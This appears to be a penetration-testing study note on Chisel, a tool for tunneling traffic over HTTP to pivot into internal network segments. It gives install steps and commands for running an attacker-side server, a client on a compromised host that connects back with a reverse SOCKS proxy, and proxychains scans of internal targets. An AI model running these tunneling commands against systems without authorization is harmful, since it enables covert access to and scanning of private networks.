# Chisel

Fast TCP/UDP tunnel over HTTP, secured via SSH under the hood. A single binary that runs as either a server (on Kali) or a client (dropped on a compromised target), used for pivoting into a network segment that isn't otherwise reachable.

> **No current module cross-link yet.** None of the 7 modules covered so far (Information Gathering through Client-Side Attacks) teach pivoting/tunneling, that's later curriculum. Included here anyway since this is the exact tool named as the motivating example for this whole tooling sweep, will get wired into a real module section once pivoting content is actually covered.

---

## What it would replace, and why it's faster

The traditional manual approach to pivoting is SSH local/remote/dynamic port forwarding (`ssh -L`/`-R`/`-D`) chained with `proxychains`, which works but is fiddly to set up correctly (especially multiple hops) and requires SSH access specifically. Chisel works over plain HTTP (so it survives more restrictive firewalls that only allow outbound web traffic) and doesn't require SSH on the target at all, just the ability to drop and run a single static binary.

## Install

Ships in Kali's tools by default. If missing:
```bash
sudo apt install chisel
# or: go install github.com/jpillora/chisel@latest
```

## Usage

```bash
# On Kali (attacker), run the server
chisel server -p 8000 --reverse

# On the compromised target, run the client, connecting back to Kali and opening a reverse SOCKS proxy
./chisel client <kali_ip>:8000 R:socks

# SOCKS (Socket Secure) is a protocol that lets you route any TCP/UDP traffic through a proxy server;
# once Chisel opens a SOCKS listener, proxychains forwards your tools' connections through it
# Now route tools through the tunnel via proxychains, pointed at Chisel's local SOCKS listener (default 127.0.0.1:1080)
proxychains nmap -sT -Pn <internal_target>
```
*`--reverse` on the server side lets the target-side client initiate the connection outbound (works even when Kali can't reach the target directly, only the target can reach Kali), the more common real-world direction once you're behind a firewall. `R:socks` sets up a reverse dynamic SOCKS proxy specifically, other forwarding modes exist for single-port forwards instead of a full SOCKS proxy.*

See also [[Ligolo-ng]] for a TUN-interface-based alternative that skips `proxychains` entirely once pivoting content is actually covered.

#### Tags: #ModernTooling #Chisel #Pivoting #Tunneling #ProxyChains
